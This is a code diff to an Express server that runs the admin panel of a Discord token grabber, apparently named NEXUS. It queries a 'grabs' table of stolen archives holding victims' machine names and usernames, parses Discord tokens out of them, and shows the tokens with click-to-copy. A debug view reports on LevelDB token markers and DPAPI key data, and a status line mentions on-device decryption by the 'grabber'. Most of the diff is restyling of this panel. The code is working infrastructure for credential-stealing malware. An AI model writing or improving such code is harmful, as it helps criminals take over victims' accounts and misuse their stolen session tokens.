@@ -245,7 +245,6 @@ function renderPage(entries, totalSize, k, { hasBg = false, theme = null } = {})
 <link rel="preconnect" href="https://fonts.googleapis.com">
 <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
 <link href="https://fonts.googleapis.com/css2?family=Space+Grotesk:wght@400;500;600;700&family=JetBrains+Mono:wght@400;500&display=swap" rel="stylesheet">
-${themeOverride}
 <style>
 :root{
   --void:#04040C;
@@ -460,6 +459,7 @@ tbody tr.fresh{animation:fadeUp .3s ease both,freshPulse 1.4s ease 0.3s 3}
   tbody tr.fresh{animation:none}
 }
 </style>
+${themeOverride}
 </head>
 <body>
 <div class="shell">
@@ -950,12 +950,25 @@ function parseDiscordZip(zipBuf) {
 
 app.get("/dc/:id", checkKey, async (req, res) => {
   try {
-    const { rows } = await pool.query(
-      `SELECT filedata, machine, username, os FROM grabs WHERE id = $1`, [req.params.id]
-    );
+    const [grabRes, settingsRes] = await Promise.all([
+      pool.query(`SELECT filedata, machine, username, os FROM grabs WHERE id = $1`, [req.params.id]),
+      pool.query(`SELECT key, val, (bin IS NOT NULL AND length(bin)>0) as has_bin FROM settings`)
+    ]);
+    const rows = grabRes.rows;
     if (!rows.length) return res.status(404).send(page404());
     const results = parseDiscordZip(rows[0].filedata);
     const k = encodeURIComponent(req.query.key);
+    const smap = {};
+    settingsRes.rows.forEach(r => { smap[r.key] = r; });
+    const hasBg = !!(smap.background_image && smap.background_image.has_bin);
+    let theme = null;
+    if (smap.theme_colors && smap.theme_colors.val) {
+      try { theme = JSON.parse(smap.theme_colors.val); } catch {}
+    }
+    const themeOvr = theme
+      ? `<style>:root{--accent:${esc(theme.accent)};--accent-dim:${esc(theme.accent)}26;--glow:${esc(theme.glow)}}</style>`
+      : '';
+    const bgTs = Date.now();
 
     // zip contents + deep debug
     let zipEntries = [];
@@ -1002,79 +1015,251 @@ app.get("/dc/:id", checkKey, async (req, res) => {
       }
     } catch(e) { zipEntries = ['zip parse error: ' + e.message]; }
 
-    const cards = results.length ? results.map(r => {
+    const machine = esc(rows[0].machine || req.params.id);
+
+    const cards = results.length ? results.map((r, i) => {
       if (r.encrypted) return `
-        <div class="tcard enc">
-          <div class="tc-tag">${esc(r.source)} &mdash; ENCRYPTED</div>
-          <div class="tc-label">STATUS</div>
-          <div class="tc-val red">Token encrypted with DPAPI — decryption happens on-device (update grabber)</div>
-          <div class="tc-label">MACHINE</div><div class="tc-val">${esc(r.machine)} \\ ${esc(r.user)}</div>
+        <div class="tcard enc row-${Math.min(i,8)}">
+          <div class="tc-head">
+            <span class="tc-src">${esc(r.source)}</span>
+            <span class="tc-status enc-tag">ENCRYPTED</span>
+          </div>
+          <div class="tc-field">
+            <div class="tc-label">Status</div>
+            <div class="tc-data red">DPAPI-encrypted &mdash; token is decrypted on-device only</div>
+          </div>
+          <div class="tc-field">
+            <div class="tc-label">Machine</div>
+            <div class="tc-data">${esc(r.machine)}<span class="muted"> \\ ${esc(r.user)}</span></div>
+          </div>
         </div>`;
-      const tokenRows = (r.tokens||[]).map(t => `
-          <div class="tc-val mono selectable" onclick="cp(this)" title="click to copy">${esc(t)}</div>`).join("");
+      const toks = (r.tokens || []);
+      const tokenRows = toks.map(t => `
+        <div class="token-val" onclick="cp(this)" title="Click to copy">${esc(t)}</div>`).join("");
       return `
-        <div class="tcard">
-          <div class="tc-tag">${esc(r.source)} &mdash; ${(r.tokens||[]).length} token(s)</div>
-          <div class="tc-label">TOKEN</div>
-          ${tokenRows}
-          <div class="tc-hint">click token to copy</div>
-          <div class="tc-label">MACHINE</div><div class="tc-val">${esc(r.machine)} \\ ${esc(r.user)}</div>
-          <div class="tc-label">OS</div><div class="tc-val dim">${esc(r.os)}</div>
+        <div class="tcard row-${Math.min(i,8)}">
+          <div class="tc-head">
+            <span class="tc-src">${esc(r.source)}</span>
+            <span class="tc-status">${toks.length} token${toks.length !== 1 ? 's' : ''}</span>
+          </div>
+          <div class="tc-field">
+            <div class="tc-label">Token${toks.length > 1 ? 's' : ''} <span class="hint">— click to copy</span></div>
+            ${tokenRows}
+          </div>
+          <div class="tc-row">
+            <div class="tc-field half">
+              <div class="tc-label">Machine</div>
+              <div class="tc-data">${esc(r.machine)}<span class="muted"> \\ ${esc(r.user)}</span></div>
+            </div>
+            <div class="tc-field half">
+              <div class="tc-label">OS</div>
+              <div class="tc-data muted">${esc(r.os)}</div>
+            </div>
+          </div>
         </div>`;
-    }).join("") : `<div class="empty"><div class="icon">&#9673;</div><p>no discord tokens found in this grab</p></div>
-      <div class="tcard" style="margin-top:20px">
-        <div class="tc-tag">ZIP CONTENTS (DEBUG)</div>
-        ${zipEntries.map(e => `<div class="tc-val mono" style="font-size:10px;margin-bottom:2px">${esc(e)}</div>`).join('')}
-        <div class="tc-label" style="margin-top:14px">DEEP SCAN</div>
-        <div class="tc-val mono" style="font-size:10px">LocalState hasEncKey: ${deepDbg.hasEncKey} | len: ${deepDbg.lsLen} | b64len: ${deepDbg.encKeyB64Len}</div>
-        <div class="tc-label" style="margin-top:8px">\\x01token HITS (+ v10 check)</div>
-        ${Object.entries(deepDbg.tokenMarkers||{}).map(([f,c])=>`<div class="tc-val mono" style="font-size:10px">${esc(f)}: ${esc(c)}</div>`).join('') || '<div class="tc-val red" style="font-size:10px">NO \\x01token FOUND IN ANY LDB</div>'}
-        <div class="tc-label" style="margin-top:8px">HEX CONTEXT (8 before + 80 after each hit)</div>
-        ${(deepDbg.hexCtx||[]).map(h=>`<div class="tc-val mono" style="font-size:9px;word-break:break-all;margin-bottom:4px">${esc(h)}</div>`).join('') || '<div class="tc-val dim" style="font-size:10px">none</div>'}
+    }).join("") : `
+      <div class="empty"><div class="empty-icon">&#9673;</div><p>NO TOKENS FOUND</p></div>
+      <div class="tcard debug row-1">
+        <div class="tc-head"><span class="tc-src">DEBUG</span></div>
+        <div class="tc-field">
+          <div class="tc-label">Zip Contents</div>
+          ${zipEntries.map(e => `<div class="dbg-line">${esc(e)}</div>`).join('')}
+        </div>
+        <div class="tc-field">
+          <div class="tc-label">Deep Scan</div>
+          <div class="dbg-line">hasEncKey: ${deepDbg.hasEncKey} | lsLen: ${deepDbg.lsLen} | b64len: ${deepDbg.encKeyB64Len}</div>
+        </div>
+        <div class="tc-field">
+          <div class="tc-label">\\x01token Hits</div>
+          ${Object.entries(deepDbg.tokenMarkers||{}).map(([f,c])=>`<div class="dbg-line">${esc(f)}: ${esc(c)}</div>`).join('') || '<div class="dbg-line red">NO \\x01token IN ANY LDB</div>'}
+        </div>
+        <div class="tc-field">
+          <div class="tc-label">Hex Context</div>
+          ${(deepDbg.hexCtx||[]).map(h=>`<div class="dbg-line hex">${esc(h)}</div>`).join('') || '<div class="dbg-line muted">none</div>'}
+        </div>
       </div>`;
 
     res.send(`<!DOCTYPE html>
 <html lang="en">
 <head>
 <meta charset="utf-8">
-<title>tokens</title>
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<title>NEXUS — Tokens</title>
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+<link href="https://fonts.googleapis.com/css2?family=Space+Grotesk:wght@400;500;600;700&family=JetBrains+Mono:wght@400;500&display=swap" rel="stylesheet">
 <style>
-:root{--bg:#06060f;--card:#0c0c1e;--border:#14142e;--text:#8888aa;--dim:#44446a;--accent:#c084fc;--green:#4ade80;--red:#f87171;--mono:'Cascadia Code','Fira Code','Consolas',monospace}
+:root{
+  --void:#04040C;
+  --glass:rgba(10,8,22,0.58);
+  --glass-b:rgba(255,255,255,0.08);
+  --text:#C4C0DC;
+  --muted:#52506A;
+  --accent:#A855F7;
+  --accent-dim:#A855F726;
+  --glow:#7C3AED;
+  --green:#4ADE80;
+  --red:#F87171;
+  --sans:'Space Grotesk',system-ui,sans-serif;
+  --mono:'JetBrains Mono','Cascadia Code','Fira Code',monospace
+}
 *{margin:0;padding:0;box-sizing:border-box}
-body{background:var(--bg);color:var(--text);font-family:var(--mono);font-size:13px;min-height:100vh;padding:30px 24px}
-a.back{color:var(--dim);text-decoration:none;font-size:11px;display:inline-block;margin-bottom:24px}
-a.back:hover{color:var(--accent)}
-h2{color:var(--accent);letter-spacing:3px;font-size:13px;margin-bottom:20px}
-.tcard{background:var(--card);border:1px solid var(--border);border-radius:10px;padding:22px 24px;margin-bottom:16px;position:relative}
-.tcard::before{content:'';position:absolute;top:0;left:0;right:0;height:2px;background:linear-gradient(90deg,var(--accent),transparent);border-radius:10px 10px 0 0}
-.tcard.enc::before{background:linear-gradient(90deg,var(--red),transparent)}
-.tc-tag{font-size:10px;color:var(--dim);letter-spacing:2px;margin-bottom:14px;text-transform:uppercase}
-.tc-label{font-size:9px;color:var(--dim);text-transform:uppercase;letter-spacing:2px;margin-top:12px;margin-bottom:4px}
-.tc-val{color:#eee;word-break:break-all;line-height:1.5}
-.tc-val.mono{font-family:var(--mono);cursor:pointer}
-.tc-val.small{font-size:10px}
-.tc-val.red{color:var(--red)}
-.tc-val.dim{color:var(--dim)}
-.tc-hint{font-size:9px;color:var(--dim);margin-top:4px}
-.selectable{user-select:all}
-.empty{text-align:center;padding:60px 20px;color:var(--dim)}
-.empty .icon{font-size:32px;margin-bottom:10px;opacity:.3}
-.toast{position:fixed;bottom:24px;right:24px;background:var(--accent);color:#000;padding:10px 18px;border-radius:8px;font-size:12px;opacity:0;transition:opacity .3s;pointer-events:none}
-.toast.show{opacity:1}
+body{
+  background-color:var(--void);
+  ${hasBg ? `background-image:url('/bg?t=${bgTs}');background-size:cover;background-attachment:fixed;background-position:center;` : ''}
+  color:var(--text);font-family:var(--sans);font-size:13px;
+  min-height:100vh;-webkit-font-smoothing:antialiased
+}
+body::before{
+  content:'';position:fixed;inset:0;
+  background:rgba(2,2,10,${hasBg ? '0.55' : '0'});
+  pointer-events:none;z-index:0
+}
+.shell{position:relative;z-index:1;max-width:860px;margin:0 auto;padding:20px}
+
+/* top bar */
+.topbar{
+  display:flex;align-items:center;justify-content:space-between;
+  padding:12px 18px;
+  background:var(--glass);
+  backdrop-filter:blur(24px);-webkit-backdrop-filter:blur(24px);
+  border:1px solid var(--glass-b);border-radius:14px;
+  margin-bottom:20px
+}
+.back-btn{
+  font-family:var(--mono);font-size:10px;color:var(--muted);
+  text-decoration:none;letter-spacing:1px;
+  transition:color .15s
+}
+.back-btn:hover{color:var(--accent)}
+.page-title{
+  font-family:var(--mono);font-size:10px;
+  color:var(--text);letter-spacing:2px;text-transform:uppercase
+}
+
+/* token cards */
+.tcard{
+  background:var(--glass);
+  backdrop-filter:blur(16px);-webkit-backdrop-filter:blur(16px);
+  border:1px solid var(--glass-b);border-radius:14px;
+  padding:22px 22px;margin-bottom:12px;
+  position:relative;overflow:hidden;
+  animation:fadeUp .3s ease both
+}
+@keyframes fadeUp{from{opacity:0;transform:translateY(6px)}to{opacity:1;transform:none}}
+${Array.from({length:9},(_,i)=>`.row-${i}{animation-delay:${i*50}ms}`).join('')}
+
+/* shimmer — same as main page */
+.tcard::after{
+  content:'';position:absolute;
+  top:-60%;left:-80%;width:55%;height:220%;
+  background:linear-gradient(105deg,transparent 35%,rgba(255,255,255,0.06) 50%,transparent 65%);
+  transform:skewX(-18deg);pointer-events:none;opacity:0
+}
+.tcard:hover::after{animation:sweep .55s ease-out forwards}
+@keyframes sweep{0%{left:-80%;opacity:1}100%{left:130%;opacity:1}}
+
+/* top line */
+.tcard::before{
+  content:'';position:absolute;top:0;left:0;right:0;height:1px;
+  background:linear-gradient(90deg,var(--accent),transparent 65%)
+}
+.tcard.enc::before{background:linear-gradient(90deg,var(--red),transparent 65%)}
+
+.tc-head{
+  display:flex;align-items:center;gap:10px;margin-bottom:16px
+}
+.tc-src{
+  font-family:var(--mono);font-size:9px;font-weight:500;
+  color:var(--muted);text-transform:uppercase;letter-spacing:2px
+}
+.tc-status{
+  font-family:var(--mono);font-size:9px;font-weight:700;
+  letter-spacing:1px;padding:2px 8px;border-radius:5px;
+  background:rgba(168,85,247,0.12);color:var(--accent)
+}
+.enc-tag{background:rgba(248,113,113,0.1);color:var(--red)}
+
+.tc-field{margin-bottom:14px}
+.tc-field:last-child{margin-bottom:0}
+.tc-label{
+  font-family:var(--mono);font-size:9px;color:var(--muted);
+  text-transform:uppercase;letter-spacing:2px;margin-bottom:6px
+}
+.hint{font-size:8px;color:var(--muted);letter-spacing:1px;opacity:.7;text-transform:none}
+.tc-data{color:#EAE6FF;line-height:1.5;font-size:13px}
+.tc-data.red{color:var(--red)}
+.muted{color:var(--muted)}
+
+/* clickable token */
+.token-val{
+  font-family:var(--mono);font-size:11px;
+  color:#EAE6FF;word-break:break-all;line-height:1.6;
+  padding:10px 12px;border-radius:8px;
+  border:1px solid rgba(255,255,255,0.05);
+  background:rgba(0,0,0,0.2);
+  cursor:pointer;user-select:all;
+  transition:background .15s,border-color .15s;
+  margin-bottom:6px
+}
+.token-val:last-child{margin-bottom:0}
+.token-val:hover{background:var(--accent-dim);border-color:rgba(168,85,247,0.25)}
+.token-val:active{background:rgba(168,85,247,0.2)}
+
+/* two-column row */
+.tc-row{display:flex;gap:16px}
+.half{flex:1;min-width:0}
+
+/* debug */
+.dbg-line{
+  font-family:var(--mono);font-size:10px;color:var(--muted);
+  line-height:1.6;word-break:break-all
+}
+.dbg-line.hex{font-size:9px;opacity:.7}
+.dbg-line.red{color:var(--red)}
+
+.empty{text-align:center;padding:60px 20px;color:var(--muted)}
+.empty-icon{font-size:28px;margin-bottom:12px;opacity:.2}
+.empty p{font-family:var(--mono);font-size:10px;letter-spacing:2px}
+
+/* toast */
+.toast{
+  position:fixed;bottom:24px;right:24px;
+  background:var(--accent);color:#fff;
+  padding:10px 18px;border-radius:10px;
+  font-family:var(--mono);font-size:11px;letter-spacing:1px;
+  opacity:0;transform:translateY(6px);
+  transition:opacity .2s,transform .2s;pointer-events:none;
+  box-shadow:0 4px 24px rgba(168,85,247,0.35)
+}
+.toast.show{opacity:1;transform:none}
+
+@media(max-width:600px){
+  .shell{padding:12px}
+  .tc-row{flex-direction:column;gap:10px}
+}
+@media(prefers-reduced-motion:reduce){
+  .tcard{animation:none}
+  .tcard::after,.tcard:hover::after{animation:none}
+}
 </style>
+${themeOvr}
 </head>
 <body>
-<a class="back" href="/?key=${k}">← back</a>
-<h2>DISCORD TOKENS &mdash; ${esc(rows[0].machine || req.params.id)}</h2>
-${cards}
-<div class="toast" id="toast">copied</div>
+<div class="shell">
+  <div class="topbar">
+    <a class="back-btn" href="/?key=${k}">← Back</a>
+    <span class="page-title">${machine}</span>
+  </div>
+  ${cards}
+</div>
+<div class="toast" id="toast">Copied</div>
 <script>
 function cp(el){
-  const t=el.innerText;
-  navigator.clipboard.writeText(t).then(()=>{
-    const toast=document.getElementById('toast');
-    toast.classList.add('show');
-    setTimeout(()=>toast.classList.remove('show'),1500);
+  navigator.clipboard.writeText(el.innerText).then(function(){
+    var t=document.getElementById('toast');
+    t.classList.add('show');
+    setTimeout(function(){t.classList.remove('show')},1400);
   });
 }
 </script>
